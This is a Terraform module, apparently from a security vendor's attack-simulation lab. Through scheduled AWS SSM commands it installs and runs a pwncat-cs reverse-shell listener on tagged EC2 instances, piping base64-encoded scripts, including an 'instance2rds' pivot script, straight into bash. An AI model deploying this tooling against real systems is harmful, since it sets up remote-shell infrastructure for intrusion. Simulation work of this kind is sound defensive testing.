locals {
    listen_port = var.listen_port
    listen_ip = var.listen_ip
    app_dir = "/pwncat"
    base64_command_payload = base64encode(var.payload)
    payload = <<-EOT
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    check_apt() {
        pgrep -f "apt" || pgrep -f "dpkg"
    }
    while check_apt; do
        log "Waiting for apt to be available..."
        sleep 10
    done

    log "setting up reverse shell listener: ${local.listen_ip}:${local.listen_port}"
    screen -S pwncat -X quit
    truncate -s 0 /tmp/pwncat.log
    log "cleaning app directory"
    rm -rf ${local.app_dir}
    mkdir -p ${local.app_dir}/plugins ${local.app_dir}/resources
    cd ${local.app_dir}
    echo ${local.listener} | base64 -d > ${local.app_dir}/listener.py
    echo ${local.responder} | base64 -d > ${local.app_dir}/plugins/responder.py
    echo ${local.instance2rds} | base64 -d > ${local.app_dir}/resources/instance2rds.sh
    log "installing required python3.9..."
    apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
    python3.9 get-pip.py >> $LOGFILE 2>&1
    log "wait before using module..."
    sleep 5
    python3.9 -m pip install -U pip setuptools wheel setuptools_rust >> $LOGFILE 2>&1
    python3.9 -m pip install -U pwncat-cs >> $LOGFILE 2>&1
    log "wait before using module..."
    sleep 5
    log "starting background process via screen..."
    nohup /bin/bash -c "screen -d -L -Logfile /tmp/pwncat.log -S pwncat -m python3.9 listener.py --port ${local.listen_port}" >/dev/null 2>&1 &
    screen -S pwncat -X colon "logfile flush 0^M"
    log "listener started."
    log "done"
    EOT
    base64_payload = base64encode(local.payload)

    listener        = base64encode(file(
                                "${path.module}/resources/listener.py", 
                            ))
    responder       = base64encode(templatefile(
                                "${path.module}/resources/responder.py", 
                                {
                                    default_payload = var.payload
                                }
                            ))
    instance2rds    = base64encode(templatefile(
                                "${path.module}/resources/instance2rds.sh", 
                                {
                                    region = var.region,
                                    environment = var.environment,
                                    deployment = var.deployment
                                }
                            ))
    
}

###########################
# SSM 
###########################

resource "random_string" "this" {
    length            = 4
    special           = false
    upper             = false
    lower             = true
    numeric           = true
}

resource "aws_ssm_document" "this" {
  name          = "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}"
  document_type = "Command"

  content = jsonencode(
    {
        "schemaVersion": "2.2",
        "description": "attack simulation",
        "mainSteps": [
            {
                "action": "aws:runShellScript",
                "name": "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}",
                "precondition": {
                    "StringEquals": [
                        "platformType",
                        "Linux"
                    ]
                },
                "inputs": {
                    "timeoutSeconds": "${var.timeout}",
                    "runCommand": [
                        "echo '${local.base64_payload}' | tee /tmp/payload_${var.tag} | base64 -d | /bin/bash -"
                    ]
                }
            }
        ]
    })
}

resource "aws_resourcegroups_group" "this" {
    name = "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}"

    resource_query {
        query = jsonencode({
                    ResourceTypeFilters = [
                        "AWS::EC2::Instance"
                    ]

                    TagFilters = [
                        {
                            Key = "${var.tag}"
                            Values = [
                                "true"
                            ]
                        },
                        {
                            Key = "deployment"
                            Values = [
                                var.deployment
                            ]
                        },
                        {
                            Key = "environment"
                            Values = [
                                var.environment
                            ]
                        }
                    ]
                })
    }

    tags = {
        billing = var.environment
        owner   = "lacework"
    }
}

resource "aws_ssm_association" "this" {
    association_name = "${var.tag}_${var.environment}_${var.deployment}_${random_string.this.id}"

    name = aws_ssm_document.this.name

    targets {
        key = "resource-groups:Name"
        values = [
            aws_resourcegroups_group.this.name,
        ]
    }

    compliance_severity = "HIGH"

    # cronjob
    schedule_expression = "${var.cron}"
    
    # will apply when updated and interval when false
    apply_only_at_cron_interval = false
}